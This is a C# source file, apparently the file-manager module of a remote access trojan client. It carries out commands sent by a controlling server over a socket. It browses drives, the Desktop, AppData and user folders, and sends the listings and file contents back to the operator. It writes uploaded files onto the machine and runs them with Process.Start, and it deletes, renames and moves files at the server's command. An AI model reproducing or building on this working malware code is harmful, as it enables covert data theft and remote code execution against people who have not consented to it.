using Client.MessagePack;
using Client.Connection;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

namespace Client.Handle_Packet
{
    public class FileManager
    {
        public FileManager(MsgPack unpack_msgpack)
        {
            try
            {
                switch (unpack_msgpack.ForcePathObject("Command").AsString)
                {
                    case "getDrivers":
                        {
                            GetDrivers();
                            break;
                        }

                    case "getPath":
                        {
                            GetPath(unpack_msgpack.ForcePathObject("Path").AsString);
                            break;
                        }

                    case "uploadFile":
                        {
                            string fullPath = unpack_msgpack.ForcePathObject("Name").AsString;
                            if (File.Exists(fullPath))
                            {
                                File.Delete(fullPath);
                                Thread.Sleep(500);
                            }
                            unpack_msgpack.ForcePathObject("File").SaveBytesToFile(fullPath);
                            break;
                        }

                    case "reqUploadFile":
                        {
                            ReqUpload(unpack_msgpack.ForcePathObject("ID").AsString); ;
                            break;
                        }

                    case "socketDownload":
                        {
                            DownnloadFile(unpack_msgpack.ForcePathObject("File").AsString, unpack_msgpack.ForcePathObject("DWID").AsString);
                            break;
                        }

                    case "deleteFile":
                        {
                            string fullPath = unpack_msgpack.ForcePathObject("File").AsString;
                            File.Delete(fullPath);
                            break;
                        }

                    case "execute":
                        {
                            string fullPath = unpack_msgpack.ForcePathObject("File").AsString;
                            Process.Start(fullPath);
                            break;
                        }

                    case "createFolder":
                        {
                            string fullPath = unpack_msgpack.ForcePathObject("Folder").AsString;
                            if (!Directory.Exists(fullPath)) Directory.CreateDirectory(fullPath);
                            break;
                        }

                    case "deleteFolder":
                        {
                            string fullPath = unpack_msgpack.ForcePathObject("Folder").AsString;
                            if (Directory.Exists(fullPath)) Directory.Delete(fullPath);
                            break;
                        }

                    case "copyFile":
                        {
                            Packet.FileCopy = unpack_msgpack.ForcePathObject("File").AsString;
                            break;
                        }

                    case "pasteFile":
                        {
                            string fullPath = unpack_msgpack.ForcePathObject("File").AsString;
                            if (fullPath.Length > 0)
                            {
                                string[] filesArray = Packet.FileCopy.Split(new[] { "-=>" }, StringSplitOptions.None);
                                for (int i = 0; i < filesArray.Length; i++)
                                {
                                    try
                                    {
                                        if (filesArray[i].Length > 0)
                                        {
                                            File.Copy(filesArray[i], Path.Combine(fullPath, Path.GetFileName(filesArray[i])), true);
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                        Error(ex.Message);
                                    }
                                }
                                Packet.FileCopy = null;
                            }
                            break;
                        }

                    case "renameFile":
                        {
                            File.Move(unpack_msgpack.ForcePathObject("File").AsString, unpack_msgpack.ForcePathObject("NewName").AsString);
                            break;
                        }

                    case "renameFolder":
                        {
                            Directory.Move(unpack_msgpack.ForcePathObject("Folder").AsString, unpack_msgpack.ForcePathObject("NewName").AsString);
                            break; ;
                        }
                }

            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
                Error(ex.Message);
            }
        }

        public void GetDrivers()
        {
            try
            {
                DriveInfo[] allDrives = DriveInfo.GetDrives();
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "fileManager";
                msgpack.ForcePathObject("Command").AsString = "getDrivers";
                StringBuilder sbDriver = new StringBuilder();
                foreach (DriveInfo d in allDrives)
                {
                    if (d.IsReady)
                    {
                        sbDriver.Append(d.Name + "-=>" + d.DriveType + "-=>");
                    }
                    msgpack.ForcePathObject("Driver").AsString = sbDriver.ToString();
                    ClientSocket.Send(msgpack.Encode2Bytes());
                }
            }
            catch { }
        }

        public void GetPath(string path)
        {
            try
            {
                Debug.WriteLine($"Getting [{path}]");
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "fileManager";
                msgpack.ForcePathObject("Command").AsString = "getPath";
                StringBuilder sbFolder = new StringBuilder();
                StringBuilder sbFile = new StringBuilder();

                if (path == "DESKTOP") path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                if (path == "APPDATA") path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AppData");
                if (path == "USER") path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

                foreach (string folder in Directory.GetDirectories(path))
                {
                    sbFolder.Append(Path.GetFileName(folder) + "-=>" + Path.GetFullPath(folder) + "-=>");
                }
                foreach (string file in Directory.GetFiles(path))
                {
                    using (MemoryStream ms = new MemoryStream())
                    {
                        GetIcon(file.ToLower()).Save(ms, ImageFormat.Png);
                        sbFile.Append(Path.GetFileName(file) + "-=>" + Path.GetFullPath(file) + "-=>" + Convert.ToBase64String(ms.ToArray()) + "-=>" + new FileInfo(file).Length.ToString() + "-=>");
                    }
                }
                msgpack.ForcePathObject("Folder").AsString = sbFolder.ToString();
                msgpack.ForcePathObject("File").AsString = sbFile.ToString();
                msgpack.ForcePathObject("CurrentPath").AsString = path.ToString();
                ClientSocket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
                Error(ex.Message);
            }
        }

        private Bitmap GetIcon(string file)
        {
            try
            {
                if (file.EndsWith("jpg") || file.EndsWith("jpeg") || file.EndsWith("gif") || file.EndsWith("png") || file.EndsWith("bmp"))
                {
                    using (Bitmap myBitmap = new Bitmap(file))
                    {
                        return new Bitmap(myBitmap.GetThumbnailImage(48, 48, new Image.GetThumbnailImageAbort(() => false), IntPtr.Zero));
                    }
                }
                else
                    using (Icon icon = Icon.ExtractAssociatedIcon(file))
                    {
                        return icon.ToBitmap();
                    }
            }
            catch
            {
                return new Bitmap(48, 48);
            }
        }

        public void DownnloadFile(string file, string dwid)
        {
            TempSocket tempSocket = new TempSocket();

            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "socketDownload";
                msgpack.ForcePathObject("Command").AsString = "pre";
                msgpack.ForcePathObject("DWID").AsString = dwid;
                msgpack.ForcePathObject("File").AsString = file;
                msgpack.ForcePathObject("Size").AsString = new FileInfo(file).Length.ToString();
                tempSocket.Send(msgpack.Encode2Bytes());


                MsgPack msgpack2 = new MsgPack();
                msgpack2.ForcePathObject("Packet").AsString = "socketDownload";
                msgpack2.ForcePathObject("Command").AsString = "save";
                msgpack2.ForcePathObject("DWID").AsString = dwid;
                msgpack2.ForcePathObject("Name").AsString = Path.GetFileName(file);
                msgpack2.ForcePathObject("File").LoadFileAsBytes(file);
                tempSocket.Send(msgpack2.Encode2Bytes());
                tempSocket.Dispose();
            }
            catch
            {
                tempSocket?.Dispose();
                return;
            }
        }

        //private void ChunkSend(byte[] msg, Socket client, SslStream ssl)
        //{
        //    try
        //    {
        //        byte[] buffersize = BitConverter.GetBytes(msg.Length);
        //        client.Poll(-1, SelectMode.SelectWrite);
        //        ssl.Write(buffersize);
        //        ssl.Flush();

        //        int chunkSize = 50 * 1024;
        //        byte[] chunk = new byte[chunkSize];
        //        using (MemoryStream buffereReader = new MemoryStream(msg))
        //        {
        //            BinaryReader binaryReader = new BinaryReader(buffereReader);
        //            int bytesToRead = (int)buffereReader.Length;
        //            do
        //            {
        //                chunk = binaryReader.ReadBytes(chunkSize);
        //                bytesToRead -= chunkSize;
        //                ssl.Write(chunk);
        //                ssl.Flush();
        //            } while (bytesToRead > 0);

        //            binaryReader.Dispose();
        //        }
        //    }
        //    catch { return; }
        //}

        public void ReqUpload(string id)
        {
            try
            {
                TempSocket tempSocket = new TempSocket();
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "fileManager";
                msgpack.ForcePathObject("Command").AsString = "reqUploadFile";
                msgpack.ForcePathObject("ID").AsString = id;
                tempSocket.Send(msgpack.Encode2Bytes());
            }
            catch { return; }
        }

        public void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "fileManager";
            msgpack.ForcePathObject("Command").AsString = "error";
            msgpack.ForcePathObject("Message").AsString = ex;
            ClientSocket.Send(msgpack.Encode2Bytes());
        }
    }
}
